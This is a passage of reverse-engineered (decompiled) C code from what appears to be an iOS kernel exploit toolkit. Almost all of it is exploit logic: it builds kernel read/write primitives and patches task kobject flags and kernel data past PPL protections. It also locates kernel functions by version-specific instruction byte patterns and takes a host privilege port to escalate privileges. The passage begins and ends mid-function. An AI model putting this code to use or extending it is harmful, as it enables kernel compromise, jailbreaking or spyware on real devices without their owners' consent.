        v16 = *(uint32_t **)v14;
        *((uint64_t *)v14 + 4) = 0;
        *(__int128 *)v14 = 0u;
        *((__int128 *)v14 + 1) = 0u;
        free(v14);
        v14 = v16;
      }
      while ( v16 );
    }
    pthread_mutex_unlock(&krwCtx->someMutex2);
  }
  pthread_mutex_destroy(&krwCtx->someMutex2);
  pthread_mutex_destroy(&krwCtx->someMutex);
  v17 = krwCtx->sandboxMachoCtx;
  if ( v17 )
  {
    free_kernel_image_resources(v17);
    free((void *)krwCtx->sandboxMachoCtx);
    krwCtx->sandboxMachoCtx = 0;
  }
  v18 = krwCtx->amfiMachoCtx;
  if ( v18 )
  {
    free_kernel_image_resources(v18);
    free((void *)krwCtx->amfiMachoCtx);
    krwCtx->amfiMachoCtx = 0;
  }
  v19 = krwCtx->kextMachoCtx0;
  if ( v19 )
  {
    free_kernel_image_resources(v19);
    free((void *)krwCtx->kextMachoCtx0);
    krwCtx->kextMachoCtx0 = 0;
  }
  v20 = krwCtx->kextMachoCtx1;
  if ( v20 )
  {
    free_kernel_image_resources(v20);
    free((void *)krwCtx->kextMachoCtx1);
    krwCtx->kextMachoCtx1 = 0;
  }
  v21 = krwCtx->kextMachoCtx2;
  if ( v21 )
  {
    free_kernel_image_resources(v21);
    free((void *)krwCtx->kextMachoCtx2);
    krwCtx->kextMachoCtx2 = 0;
  }
  v22 = krwCtx->auxkcMachoCtx;
  if ( v22 )
  {
    free_kernel_image_resources(v22);
    free((void *)krwCtx->auxkcMachoCtx);
    krwCtx->auxkcMachoCtx = 0;
  }
  v23 = (uint64_t)krwCtx->kernelMachoCtx;
  if ( v23 )
  {
    free_kernel_image_resources(v23);
    free(krwCtx->kernelMachoCtx);
    krwCtx->kernelMachoCtx = 0;
  }
  v24 = (void *)krwCtx->puafPagesBuf;
  if ( v24 )
  {
    free(v24);
    krwCtx->puafPagesBuf = 0;
    krwCtx->gap_0x1D08_size4 = 0;
  }
  v25 = krwCtx->ioConnectPort;
  if ( v25 + 1 >= 2 )
  {
    mach_port_deallocate(mach_task_self_, v25);
    krwCtx->ioConnectPort = 0;
  }
  bzero(krwCtx, 0x1D60u);
  free(krwCtx);
  return 0;
}

//----- (000000000003F8C0) ----------------------------------------------------
__int64 __fastcall task_kobject_update_flag_bits(struct_krwCtx *krwCtx, unsigned int a2, int a3, int a4)
{
  __int64 result; // x0
  unsigned __int64 v8; // x22
  int v9; // w9
  int v10; // w2
  int v11; // [xsp+Ch] [xbp-34h] BYREF

  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    v8 = get_task_kobj_with_offset(krwCtx, a2);
    if ( !v8 )
      return 0;
  }
  else
  {
    result = get_task_kobj_via_physmap(krwCtx, a2);
    if ( !result )
      return result;
    v8 = result + 40;
    if ( result == -40 )
      return 0;
  }
  result = kread_u32(krwCtx, v8, &v11);
  if ( !(uint32_t)result )
    return result;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    v9 = 0xF0000000;
  else
    v9 = -2;
  if ( (v9 & v11) != 0 )
    return 0;
  if ( a4 )
    v10 = v11 | a3;
  else
    v10 = v11 & ~a3;
  if ( v10 == v11 )
    return 1;
  result = ppl_kwrite32(krwCtx, v8, v10);
  if ( (uint32_t)result )
    return 1;
  return result;
}

//----- (000000000003F9A0) ----------------------------------------------------
bool __fastcall check_krw_necp_state(struct_krwCtx *krwCtx, bool *a2)
{
  bool result; // w0
  unsigned __int8 v5; // [xsp+Fh] [xbp-21h] BYREF
  __int64 v6; // [xsp+10h] [xbp-20h] BYREF
  __int64 address; // [xsp+18h] [xbp-18h] BYREF

  v6 = 0;
  address = 0;
  result = find_kernel_text_exec_section(krwCtx, &address, &v6);
  if ( (uint32_t)result )
  {
    krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
    if ( (unsigned int)krw_read_thunk(krwCtx, address, 1, &v5) && v5 <= 1u )
    {
      *a2 = v5 != 0;
      return true;
    }
    else
    {
      return false;
    }
  }
  return result;
}

//----- (000000000003FA2C) ----------------------------------------------------
bool __fastcall check_dispatch_krw_state(struct_krwCtx *krwCtx, int a2)
{
  bool result; // w0
  unsigned __int64 v5; // x22
  unsigned __int64 v6; // x21
  int v7; // w8
  __int64 v8; // x21
  unsigned __int8 v9; // [xsp+Eh] [xbp-32h] BYREF
  unsigned __int8 v10; // [xsp+Fh] [xbp-31h] BYREF
  unsigned __int64 v11; // [xsp+10h] [xbp-30h] BYREF
  unsigned __int64 v12; // [xsp+18h] [xbp-28h] BYREF

  v11 = 0;
  v12 = 0;
  result = find_kernel_text_exec_section(krwCtx, (__int64 *)&v11, (__int64 *)&v12);
  if ( (uint32_t)result )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      v5 = v12;
      if ( !(unsigned int)krw_read_thunk(krwCtx, v12, 1, &v10) )
        return false;
      if ( v10 > 1u )
        return false;
      v6 = v11;
      if ( !(unsigned int)krw_read_thunk(krwCtx, v11, 1, &v9) )
        return false;
      v7 = v9;
      if ( v9 > 1u )
        return false;
      if ( v10 != a2 )
      {
        v10 = a2;
        if ( !(unsigned int)ppl_kwritebuf(krwCtx, v5, &v10, 1) )
          return false;
        v7 = v9;
      }
      if ( v7 != a2 )
      {
        v9 = a2;
        if ( !(unsigned int)ppl_kwritebuf(krwCtx, v6, &v9, 1) )
          return false;
      }
    }
    else
    {
      v8 = v11;
      if ( !(unsigned int)krw_read_thunk(krwCtx, v11, 1, &v10) )
        return false;
      if ( v10 > 1u )
        return false;
      if ( v10 != a2 )
      {
        v10 = a2;
        if ( !(unsigned int)kwrite_with_retry(krwCtx, v8, (__int64)&v10, 1) )
          return false;
      }
    }
    return true;
  }
  return result;
}

//----- (000000000003FB84) ----------------------------------------------------
bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2, __int64 *a3)
{
  __int64 v6; // x8
  __int64 v7; // x22
  __int64 v8; // x23
  __int64 v10; // x22
  int v11; // w22
  char *v12; // x1
  __int64 v13; // x23
  __int64 v15; // x8
  unsigned __int64 pattern; // x0
  unsigned __int64 func; // x0
  __int64 sect[3]; // [xsp+0h] [xbp-50h] BYREF
  __int64 v19; // [xsp+18h] [xbp-38h] BYREF

  v19 = 0;
  v8 = 0;
  v6 = krwCtx->mappedKernelRegion;
  if ( v6 && krwCtx->mappedKernelSize )
  {
    v7 = *(uint64_t *)(v6 + 328);
    v19 = v7;
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && v7 )
    {
      *a2 = v7;
      return true;
    }
    v8 = *(uint64_t *)(krwCtx->mappedKernelRegion + 320LL);
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && v7 && v8 != 0 )
    {
      *a2 = v7;
      *a3 = v8;
      return true;
    }
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    macho_getsectbyname("__TEXT_EXEC", krwCtx->kernelMachoCtx, "__text", sect);
    if ( !sect[1] || !sect[2] )
      return false;
    pattern = kernel_pattern_scan((__int64)sect, "08 01 40 39 08 01 00 12", 0);
    if ( !pattern )
      return false;
    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
    if ( !func )
      return false;
    if ( !kread_physmap_decorated(krwCtx, func, (unsigned __int64 *)&v19) )
      return false;
    *a2 = v19;
    v10 = v19 - 1;
    goto LABEL_40;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
  {
    v11 = krwCtx->xnuMajorVersion;
    resolve_kernel_text_range((uint64_t *)sect, krwCtx);
    if ( !sect[1] || !sect[2] )
      return false;
    v12 = v11 <= 8795 ? "6A 00 00 37 40 00 00 34" : "6B 00 00 37 40 00 00 34";
    pattern = kernel_pattern_scan((__int64)sect, v12, 0);
    if ( !pattern )
      return false;
    v13 = pattern;
    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 16));
    if ( !func )
      return false;
    v10 = func;
    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v13 - 8));
    if ( !func )
      return false;
    v19 = func;
    *a2 = func;
    v8 = v10;
LABEL_40:
    *a3 = v10;
    v15 = krwCtx->mappedKernelRegion;
    if ( v15 && krwCtx->mappedKernelSize )
    {
      *(uint64_t *)(v15 + 320) = v8;
      *(uint64_t *)(v15 + 328) = v19;
    }
    return true;
  }
  else
  {
    resolve_kernel_text_range((uint64_t *)sect, krwCtx);
    if ( sect[1] && sect[2] )
    {
      if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8796, 100, 721, 0, 0) )
      {
        pattern = kernel_pattern_scan((__int64)sect, "09 FD 9F 08 C0 03 5F D6", 0);
        if ( !pattern )
          return false;
        func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
      }
      else
      {
        pattern = kernel_pattern_scan((__int64)sect, "09 01 00 39 C0 03 5F D6", 0);
        if ( !pattern )
          return false;
        func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
        if ( !func )
          return false;
        func = macho_read_u64_thunk(krwCtx->kernelMachoCtx, func);
      }
      v19 = func;
      if ( !func )
        return false;
      v10 = 0;
      *a2 = func;
      goto LABEL_40;
    }
  }
  return false;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (000000000003FE68) ----------------------------------------------------
int __fastcall update_physmap_table_entry_count(struct_krwCtx *krwCtx, task_inspect_t a2, host_t *a3)
{
  host_t v4; // w2
  int result; // w0

  v4 = krwCtx->hostPrivPort;
  if ( v4 + 1 < 2 )
    return 0;
  if ( krwCtx->xnuVersionPacked >= 0x1C1B1914600000uLL )
  {
    result = set_task_special_port_and_patch_uid(krwCtx, a2, v4);
    if ( !result )
      return result;
    v4 = krwCtx->hostPrivPort;
  }
  *a3 = v4;
  return 1;
}
// 3FEB8: variable 'v6' is possibly undefined

//----- (000000000003FED4) ----------------------------------------------------
uint64_t *__fastcall alloc_kobj_snapshot_buf(__int64 a1, __int64 a2)
{
  struct kobj_snapshot_buf *v4; // x21
  uint64_t *v5; // x22
  size_t v6; // x19
  void *v7; // x23
  __int64 v8; // x8

  v4 = calloc(1u, 0x18u);
  v5 = calloc(1u, 0x48u);
  kread_via_kobject(a1, a2, (__int64)v5, 72);
  v4->sectionHeader = v5;
  v6 = v5[4];
  v7 = malloc(v6);
  kread_via_kobject(a1, v5[3], (__int64)v7, v6);
  v8 = v5[4];
  v4->bytes = v7;
  v4->size = v8;
  return (uint64_t *)v4;
}

//----- (000000000003FF78) ----------------------------------------------------
__int64 __fastcall read_u32_from_kobj_snapshot(__int64 a1, uint64_t *a2, __int64 a3)
{
  struct kobj_snapshot_buf *snapshot = (struct kobj_snapshot_buf *)a2;
  return *(unsigned int *)(snapshot->bytes + a3 - snapshot->sectionHeader[3]);
}

//----- (000000000003FF8C) ----------------------------------------------------
unsigned __int64 __fastcall kobj_snapshot_lookup_wrapper(uint64_t **a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return kobj_snapshot_pattern_search(0, *a1, a2, a3, a4);
}

//----- (000000000003FFA0) ----------------------------------------------------
unsigned __int64 __fastcall kobj_snapshot_pattern_search(__int64 a1, uint64_t *a2, __int64 a3, __int64 a4, unsigned int a5)
{
  struct kobj_snapshot_buf *snapshot; // x8
  unsigned __int64 scanStart; // x8
  unsigned __int64 scanEnd; // x9
  unsigned __int64 cursor; // x10
  __int64 v8; // x12
  unsigned __int64 result; // x0

  snapshot = (struct kobj_snapshot_buf *)a2;
  scanStart = (unsigned __int64)snapshot->bytes;
  scanEnd = scanStart + snapshot->size - 4LL * a5;
  if ( scanEnd <= scanStart )
    return 0LL;
  cursor = scanStart;
  while ( a5 )
  {
    v8 = 0LL;
    while ( (*(uint32_t *)(a4 + v8) & *(uint32_t *)(cursor + v8)) == *(uint32_t *)(a3 + v8) )
    {
      v8 += 4LL;
      if ( 4LL * a5 == v8 )
        return cursor - scanStart + snapshot->sectionHeader[3];
    }
    result = 0LL;
    cursor += 4LL;
    if ( cursor >= scanEnd )
      return result;
  }
  cursor = scanStart;
  return cursor - scanStart + snapshot->sectionHeader[3];
}

//----- (0000000000040024) ----------------------------------------------------
unsigned __int64 __fastcall kobj_snapshot_pattern_search_via_ctx(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  return kobj_snapshot_pattern_search(0, *(uint64_t **)(a1 + 8), a2, a3, a4);
}

//----- (0000000000040038) ----------------------------------------------------
uint64_t *__fastcall find_section_in_macho_snapshot(__int64 a1, const char *a2)
{
  unsigned __int64 *v4; // x0
  unsigned __int64 v5; // x21
  int v6; // w0
  int v7; // w22
  unsigned __int64 v8; // x21
  int v9; // w24
  unsigned int v10; // w23
  char __s1[8]; // [xsp+8h] [xbp-48h] BYREF
  __int64 v13; // [xsp+10h] [xbp-40h]

  v4 = *(unsigned __int64 **)(a1 + 16);
  v5 = *v4;
  if ( (unsigned int)kread_u32_value((__int64)v4, *v4) != -17958193 )
    return 0;
  v6 = kread_u32_value(*(uint64_t *)(a1 + 16), v5 + 16);
  if ( !v6 )
    return 0;
  v7 = v6;
  v8 = v5 + 32;
  while ( 1 )
  {
    v9 = kread_u32_value(*(uint64_t *)(a1 + 16), v8);
    v10 = kread_u32_value(*(uint64_t *)(a1 + 16), v8 + 4);
    if ( v9 == 25 )
    {
      *(uint64_t *)__s1 = 0;
      v13 = 0;
      kread_via_kobject(*(uint64_t *)(a1 + 16), v8 + 8, (__int64)__s1, 16);
      if ( !strcmp(__s1, a2) )
        break;
    }
    v8 += v10;
    if ( !--v7 )
      return 0;
  }
  return alloc_kobj_snapshot_buf(*(uint64_t *)(a1 + 16), v8);
}

//----- (000000000004014C) ----------------------------------------------------
__int64 __fastcall init_text_exec_data_const_sections(uint64_t *a1)
{
  uint64_t *v2; // x0
  bool v3; // zf

  *a1 = find_section_in_macho_snapshot((__int64)a1, "__TEXT_EXEC");
  v2 = find_section_in_macho_snapshot((__int64)a1, "__DATA_CONST");
  a1[1] = v2;
  if ( v2 )
    v3 = *a1 == 0;
  else
    v3 = 1;
  if ( v3 )
    return 5;
  else
    return 0;
}

//----- (00000000000401A4) ----------------------------------------------------
__int64 __fastcall compute_optimal_kobj_stride(__int64 result, __int64 a2)
{
  unsigned int v2; // w8
  unsigned int v3; // w9

  v2 = *(uint32_t *)(result + 384);
  if ( !((unsigned int)a2 % v2) )
    return a2;
  v3 = 2 * v2;
  if ( 2 * v2 > 0x8000 )
    return *(unsigned int *)(result + 384);
  LODWORD(result) = *(uint32_t *)(result + 384);
  do
  {
    if ( 100 * (v3 % (unsigned int)a2) / v3 >= 100 * ((unsigned int)result % (unsigned int)a2) / (unsigned int)result )
      result = (unsigned int)result;
    else
      result = v3;
    v3 += v2;
  }
  while ( v3 <= 0x8000 );
  return result;
}

//----- (0000000000040210) ----------------------------------------------------
__int64 __fastcall compute_kobj_scan_halfstride(struct_krwCtx *krwCtx)
{
  unsigned int v1; // w8

  v1 = 4 * krwCtx->pageSizeOrSomething;
  if ( v1 <= 0x4000 )
    v1 = 0x4000;
  return (v1 >> 1) | 1;
}

//----- (0000000000040230) ----------------------------------------------------
__int64 __fastcall get_voucher_attr_recipe_versioned(struct_krwCtx *krwCtx, __int128 *a2, uint32_t *a3)
{
  int v3; // w8
  __int64 result; // x0
  bool v5; // zf
  int v6; // w9

  v3 = krwCtx->xnuMajorVersion;
  result = 0xFFFFFFFFLL;
  if ( v3 > 8791 )
  {
    v5 = v3 == 8792 || v3 == 10002;
    v6 = 8796;
  }
  else
  {
    v5 = (unsigned int)(v3 - 8019) < 2 || v3 == 6153;
    v6 = 7195;
  }
  if ( v5 || v3 == v6 )
  {
    if ( a2 )
    {
      if ( *a3 < 0x1Bu )
        return 0xFFFFFFFFLL;
      *a2 = xmmword_43760;
      a2[1] = unk_43770;
      *(__int128 *)((char *)a2 + 92) = unk_437BC;
      a2[4] = xmmword_437A0;
      a2[5] = unk_437B0;
      a2[2] = xmmword_43780;
      a2[3] = unk_43790;
    }
    result = 0LL;
    *a3 = 27;
  }
  return result;
}
// 43760: using guessed type __int128 xmmword_43760;
// 43780: using guessed type __int128 xmmword_43780;
// 437A0: using guessed type __int128 xmmword_437A0;

//----- (00000000000402CC) ----------------------------------------------------
__int64 __fastcall voucher_attr_recipe_scan(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v4; // x8
  unsigned int *i; // x9
  unsigned int v6; // [xsp+4h] [xbp-11Ch] BYREF
  __int128 v7[16]; // [xsp+8h] [xbp-118h] BYREF

  v6 = 64;
  if ( (unsigned int)get_voucher_attr_recipe_versioned(krwCtx, v7, &v6) )
    return 0;
  v4 = v6;
  if ( !v6 )
    return 0;
  for ( i = (unsigned int *)v7; ; ++i )
  {
    result = *i;
    if ( (unsigned int)result >= a2 )
      break;
    if ( !--v4 )
      return 0;
  }
  return result;
}

//----- (0000000000040364) ----------------------------------------------------
__int64 __fastcall find_aligned_kaddr_in_region(struct_krwCtx *krwCtx, unsigned __int64 a2, unsigned int a3, unsigned int a4)
{
  unsigned __int64 v4; // x10
  __int64 v5; // x8
  unsigned __int64 v6; // x11
  unsigned __int64 v7; // x12
  unsigned __int64 v8; // x10
  unsigned __int64 v9; // x10

  v4 = krwCtx->pageSizeOrSomething;
  if ( (uint32_t)v4 == a4 )
  {
    a2 &= ~krwCtx->pageMask;
  }
  else
  {
    v5 = a4 % a3;
    if ( krwCtx->xnuVersionPacked >> 43 < 0x44BuLL )
      v5 = 0LL;
    v6 = a2 + a3;
    v7 = v6 % v4;
    v8 = v4 - v6 % v4;
    if ( !v7 )
      v8 = 0LL;
    v9 = v6 - a4 + v8;
    while ( v5 != (krwCtx->pageMask & a2) )
    {
      a2 -= a3;
      if ( a2 < v9 )
        return 0LL;
    }
  }
  return a2;
}

//----- (00000000000403E0) ----------------------------------------------------
unsigned __int64 __fastcall kernel_cstring_pattern_scan(struct_krwCtx *krwCtx, const char *a2)
{
  int v4; // w8
  unsigned __int64 v5; // x21
  __int64 v6; // x23
  unsigned __int64 v7; // x0
  unsigned __int64 v8; // x22
  __int64 v9; // x25
  unsigned __int64 v10; // x0
  unsigned __int64 v11; // x23
  unsigned __int64 v12; // x8
  unsigned __int64 v13; // x0
  const char *v14; // x24
  char *v15; // x22
  char v16; // w26
  __int64 v17; // x27
  __int64 v18; // x0
  sub_197A8_result v19; // x0,x1
  uint64_t v20[3]; // [xsp-10h] [xbp-F0h]
  __int64 *scan_range[3]; // [xsp+8h] [xbp-D8h] BYREF
  uint64_t v24[3]; // [xsp+20h] [xbp-C0h] BYREF
  uint8_t v25[80]; // [xsp+38h] [xbp-A8h] BYREF

  v4 = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(v4 - 8019) >= 2 )
  {
    if ( v4 != 7195 )
      return 0;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
      v5 = 136;
    else
      v5 = 168;
    v6 = 402;
  }
  else
  {
    v5 = 168;
    v6 = 649;
  }
  v7 = krwCtx->gap_0x19A0;
  if ( v7 )
    goto LABEL_9;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
    v15 = "28 69 68 78 09 11 80 52";
  else
    v15 = "08 29 40 92 09 15 80 52";
  v20[0] = v15;
  v20[1] = 0;
  v16 = 1;
  v17 = 1;
  if ( v15 )
  {
LABEL_22:
    macho_find_text_section(krwCtx->kernelMachoCtx, v24);
    v18 = kernel_pattern_scan((__int64)v24, v15, 0);
    if ( !v18 )
      goto LABEL_23;
    v7 = find_kernel_func_aligned(krwCtx->kernelMachoCtx, v18 + 8);
    if ( v7 )
    {
      krwCtx->gap_0x19A0 = v7;
LABEL_9:
      v8 = v5 + v7;
      v9 = v6 - 1;
      do
      {
        scan_range[0] = krwCtx->kernelMachoCtx;
        scan_range[1] = (__int64 *)v8;
        scan_range[2] = (__int64 *)v5;
        v19 = macho_find_segment(scan_range, 1);
        v10 = v19.addr;
        if ( !v10 )
          break;
        v11 = v10;
        macho_walk_segment_by_name_0(krwCtx->kernelMachoCtx, v10, v5, 0);
        v12 = *(uint64_t *)(v11 + 16);
        if ( v12 )
        {
          scan_range[0] = krwCtx->kernelMachoCtx;
          scan_range[1] = (__int64 *)v12;
          scan_range[2] = (__int64 *)80;
          v19 = macho_find_segment(scan_range, 0);
          v13 = v19.addr;
          if ( v13 )
          {
            v14 = (const char *)v13;
            macho_walk_segment_by_name_0(krwCtx->kernelMachoCtx, v13, 0x50u, 0);
          }
          else
          {
            v14 = v25;
            v25[0] = 0;
            krw_read_thunk(krwCtx, *(uint64_t *)(v11 + 16), 80, v25);
          }
          if ( !strcmp(a2, v14) )
            return v8;
        }
        v8 += v5;
      }
      while ( --v9 );
    }
  }
  else
  {
LABEL_23:
    while ( (v16 & 1) != 0 )
    {
      v16 = 0;
      v15 = (char *)v20[v17];
      v17 = 2;
      if ( v15 )
        goto LABEL_22;
    }
  }
  return 0;
}
// 48940: using guessed type __int64 __chkstk_darwin(void);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (000000000004062C) ----------------------------------------------------
__int64 __fastcall find_kfunc_ptr_in_kernel_data(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v2; // x19
  int v4; // w8
  unsigned __int64 v8; // x21
  unsigned __int64 v9; // x23
  unsigned __int64 v10; // x27
  __int64 v11; // x24
  __int64 v12; // x0
  unsigned __int64 v13; // x0
  __int64 v14; // x0
  unsigned __int64 v15; // x0
  int v16; // w22
  uint64_t dataSect[3]; // [xsp+8h] [xbp-78h] BYREF
  __int64 v21; // [xsp+20h] [xbp-60h] BYREF
  __int64 v22; // [xsp+28h] [xbp-58h] BYREF

  v2 = 708625;
  v21 = 0;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
    return 708616;
  v4 = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(v4 - 8019) >= 2 && v4 != 8792 && v4 != 7195 )
    return 163884;
  v8 = a2 + 40;
  if ( !kread_physmap_decorated(krwCtx, a2 + 40, (unsigned __int64 *)&v22) )
    return 163855;
  if ( v22 )
  {
    if ( validate_kaddr_range(krwCtx, v22) )
      return 0;
    else
      return 163878;
  }
  macho_getsectbyname("__DATA", krwCtx->kernelMachoCtx, "__data", dataSect);
  v9 = dataSect[1];
  if ( !dataSect[1] || !dataSect[2] )
    return 163855;
  v10 = dataSect[1] + dataSect[2] - 256;
  if ( dataSect[1] < v10 )
  {
    v11 = dataSect[0];
    while ( 1 )
    {
      v12 = macho_read_u64_thunk(v11, v9);
      v13 = maybe_sptm_translate_kaddr(krwCtx, v12);
      if ( check_kaddr_in_physmap(krwCtx, v13) )
      {
        if ( !macho_read_u64_thunk(v11, v9 + 8) && macho_read_u64_thunk(v11, v9 + 16) == 10 )
        {
          if ( macho_read_u64_thunk(v11, v9 + 24) )
          {
            v14 = macho_read_u64_thunk(v11, v9 + 32);
            v15 = maybe_sptm_translate_kaddr(krwCtx, v14);
            if ( check_kaddr_in_physmap(krwCtx, v15) )
              break;
          }
        }
      }
      v9 += krwCtx->stride_0x168;
      if ( v9 >= v10 )
        return v2;
    }
    if ( v9 )
    {
      if ( !noppl_kwrite32(krwCtx, a2 + 136, 0x10000)
        || !(unsigned int)kwrite_with_retry(krwCtx, v9 + 24, (__int64)&v21, 8) )
      {
        return 163856;
      }
      v16 = 20;
      v2 = 708619;
      while ( 1 )
      {
        semaphore_timedwait_ns(krwCtx, 0x3D090u);
        if ( !kread_physmap_decorated(krwCtx, v8, (unsigned __int64 *)&v22) )
          break;
        if ( v22 )
          return 0;
        if ( !--v16 )
          return v2;
      }
      return 163855;
    }
  }
  return v2;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (000000000004087C) ----------------------------------------------------
__int64 __fastcall scan_kernel_page_for_pattern(
        struct_krwCtx *krwCtx,
        __int64 a2,
        mach_vm_size_t a3,
        unsigned __int64 a4,
        __int64 (__fastcall *a5)(__int64, __int64),
        __int64 a6)
{
  unsigned int v11; // w26
  __int64 v12; // x25
  __int64 v13; // x8
  __int64 v14; // x24
  unsigned __int64 v15; // x8
  __int64 v16; // x9
  unsigned __int64 v17; // x15
  unsigned __int64 v18; // x16
  unsigned __int64 v19; // x17
  unsigned __int64 v20; // x8
  bool v21; // cc
  int v22; // w0
  int v23; // w22
  int v24; // w8
  __int64 v25; // x0
  unsigned int v26; // w9
  __int64 v27; // x8
  int v28; // w22
  unsigned __int64 v29; // x1
  unsigned int v31; // [xsp+Ch] [xbp-184h] BYREF
  unsigned __int64 v32; // [xsp+10h] [xbp-180h] BYREF
  __int64 v33; // [xsp+18h] [xbp-178h] BYREF
  unsigned __int64 v34; // [xsp+20h] [xbp-170h] BYREF
  unsigned int v35; // [xsp+28h] [xbp-168h] BYREF
  int v36; // [xsp+2Ch] [xbp-164h] BYREF
  __int128 v37[16]; // [xsp+30h] [xbp-160h] BYREF

  v36 = -1;
  v34 = 0;
  LOWORD(v11) = -1;
  v12 = 163855;
  memset(v37, 0, sizeof(v37));
  v13 = 32;
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
    v13 = 40;
  if ( !kread_physmap_decorated(krwCtx, v13 + a2, (unsigned __int64 *)&v33) )
  {
    v14 = 163855;
    goto LABEL_56;
  }
  if ( !validate_kaddr_range(krwCtx, v33) )
    goto LABEL_13;
  if ( (unsigned int)(a3 - 1) > 0xFF )
  {
    v14 = 163857;
    goto LABEL_56;
  }
  v15 = krwCtx->xnuVersionPacked;
  if ( v15 <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
  {
    v20 = a4 | 1;
  }
  else
  {
    v16 = 0;
    v17 = a4;
    v18 = a4;
    v19 = a4;
    while ( (krwCtx->pageMask & v19) != 0 )
    {
      v19 -= (unsigned int)a3;
      v18 += 1LL - (unsigned int)a3;
      v17 += 4LL - (unsigned int)a3;
      if ( (uint32_t)++v16 == 1024 )
      {
        v32 = a4 - ((unsigned __int64)(unsigned int)a3 << 10);
LABEL_13:
        v14 = 163878;
        goto LABEL_56;
      }
    }
    v21 = v15 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023);
    v20 = v17 | 1;
    if ( v21 )
      v20 = v18;
  }
  v32 = v20;
  v14 = fd_open_dev_null(&v36);
  if ( (uint32_t)v14 )
    goto LABEL_56;
  if ( !kwritebuf_last_0(krwCtx, a4, v37, a3) )
    goto LABEL_55;
  v22 = get_page_size();
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
  {
    if ( !kreadbuf_last_0(krwCtx, v33 + (unsigned int)(krwCtx->pageSizeOrSomething * v22), krwCtx->stride_0x168, &v34) )
      goto LABEL_50;
    if ( !validate_kaddr_range(krwCtx, v34) )
    {
LABEL_49:
      v12 = 163878;
      goto LABEL_50;
    }
    while ( 1 )
    {
      while ( 1 )
      {
        v28 = get_page_size();
        if ( !kreadbuf_last_0(krwCtx, v33 + (unsigned int)(krwCtx->pageSizeOrSomething * v28), 4u, &v35) )
          goto LABEL_50;
        v34 = v35 | ((unsigned __int64)HIDWORD(v34) << 32);
        if ( !kreadbuf_last_0(krwCtx, v34, 4u, &v31) )
          goto LABEL_50;
        if ( !v31 )
          break;
        if ( v31 > 8 )
        {
LABEL_51:
          v12 = 163857;
          goto LABEL_50;
        }
        if ( (unsigned int)get_page_size() == v28 )
        {
          v29 = v34 + (v31 - 1) * krwCtx->stride_0x168 + 8;
          goto LABEL_53;
        }
      }
      if ( a5 )
      {
        v25 = a5(krwCtx, a6);
        if ( (uint32_t)v25 )
          break;
      }
    }
LABEL_48:
    v12 = v25;
LABEL_50:
    v14 = v12;
    goto LABEL_56;
  }
  if ( !kreadbuf_last_0(krwCtx, v33 + (unsigned int)(krwCtx->pageSizeOrSomething * v22) + 8, krwCtx->stride_0x168, &v34) )
    goto LABEL_50;
  if ( !validate_kaddr_range(krwCtx, v34) )
    goto LABEL_49;
  v23 = get_page_size();
  if ( !kreadbuf_last_0(krwCtx, v33 + (unsigned int)(krwCtx->pageSizeOrSomething * v23), 4u, &v31) )
    goto LABEL_50;
  while ( 1 )
  {
    v24 = (unsigned __int16)v31;
    if ( !(uint16_t)v31 )
    {
      v11 = HIWORD(v31);
      if ( !HIWORD(v31) )
      {
        if ( a5 )
        {
          v25 = a5(krwCtx, a6);
          if ( (uint32_t)v25 )
            goto LABEL_48;
        }
        goto LABEL_36;
      }
    }
    v26 = (unsigned __int16)v11;
    if ( (uint16_t)v31 )
      v26 = (unsigned __int16)v31;
    v31 = v26;
    if ( v26 - 1 > 7 )
      goto LABEL_51;
    if ( v24 )
      v27 = 8;
    else
      v27 = 16;
    if ( !kreadbuf_last_0(krwCtx, v33 + v27 + (unsigned int)(krwCtx->pageSizeOrSomething * v23), 4u, &v35) )
      goto LABEL_50;
    LODWORD(v34) = v35;
    if ( (unsigned int)get_page_size() == v23 )
      break;
LABEL_36:
    v23 = get_page_size();
    if ( !kreadbuf_last_0(krwCtx, v33 + (unsigned int)(krwCtx->pageSizeOrSomething * v23), 4u, &v31) )
